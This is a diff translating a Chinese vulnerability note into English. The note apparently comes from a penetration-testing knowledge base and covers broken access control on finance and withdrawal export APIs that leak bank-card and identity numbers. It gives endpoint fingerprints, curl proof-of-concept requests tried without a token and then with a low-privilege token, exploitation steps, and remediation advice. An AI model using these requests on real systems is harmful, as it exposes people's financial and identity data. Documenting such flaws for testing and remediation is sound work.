@@ -1,18 +1,18 @@
 ﻿---
-title: 财务导出接口越权（银行卡 + 身份证批量导出）
-cve: 无（业务逻辑）
+title: Unauthorized financial exports (bulk bank-card + identity-number export)
+cve: None (business logic)
 severity: critical
 cvss: 9.0
-product: 自研财务/提现模块（资金面）
-versions: 任意
+product: Custom finance/withdrawal module (financial impact)
+versions: Any
 ports: 80, 443
-keywords: 财务, 导出, 银行卡, 身份证, 提现, 越权
+keywords: finance, export, bank cards, identity numbers, withdrawals, broken access control
 entry: /api/finance/export  /api/withdraw/export
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 GET /api/finance/export?startDate=..&endDate=..
@@ -20,35 +20,35 @@ GET /api/withdraw/export?status=approved
 GET /api/admin/export/member
 ```
 
-## 前置条件
+## Prerequisites
 
-- 普通会员或低权代理 token（有时完全无鉴权）。
+- A regular member or low-privilege agent token (sometimes no authentication at all).
 
 ## PoC
 
 ```bash
-# 1) 未授权先试
+# 1) Try without authentication first
 curl -s 'https://target/api/finance/export?startDate=2026-01-01&endDate=2026-01-31' -o /tmp/e.csv -w '%{http_code} %{size_download}\n'
 head -2 /tmp/e.csv
-# 判定：200 + CSV 表头含 卡号/身份证 = 命中
+# Result: 200 + CSV headers containing card/identity numbers = confirmed
 
-# 2) 带普通 token 再试（很多站只在前端隐藏菜单）
+# 2) Retry with a regular token (many sites only hide menus in the frontend)
 curl -s 'https://target/api/withdraw/export?status=approved' -H "Authorization: Bearer <t>" -o /tmp/w.csv -w '%{http_code} %{size_download}\n'
 head -2 /tmp/w.csv
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先无 token 试（最常见）；
-2. 再带低权 token 试；两者都 403 才算安全；
-3. 命中后**只取表头与前 3 行**证明字段（卡号/身份证/手机号），不要保存全量；
-4. 证据：HTTP 头 + 表头 + 计数（总行数），内容打码。
+1. Try without a token first (most common);
+2. Then try a low-privilege token; only 403 for both counts as secure;
+3. After success, **retain only the header and first 3 rows** to demonstrate the fields (card/identity/phone numbers); do not save the full dataset;
+4. Evidence: HTTP headers + table header + count (total rows), with content masked.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 导出接口强制管理员角色 + 行级范围；异步任务 + 审计日志（谁导了多少行）。
-- 敏感字段脱敏（卡号保留后四位），导出加水印。
+- Require an administrator role + row-level scope for exports; asynchronous jobs + audit logs (who exported how many rows).
+- Mask sensitive fields (retain only the last four card digits); watermark exports.
 
-## 参考
+## References
 
-- OWASP API5 BFLA；个人信息保护合规要求（最小化导出）。
+- OWASP API5 BFLA; personal-information protection compliance requirements (minimize exports).
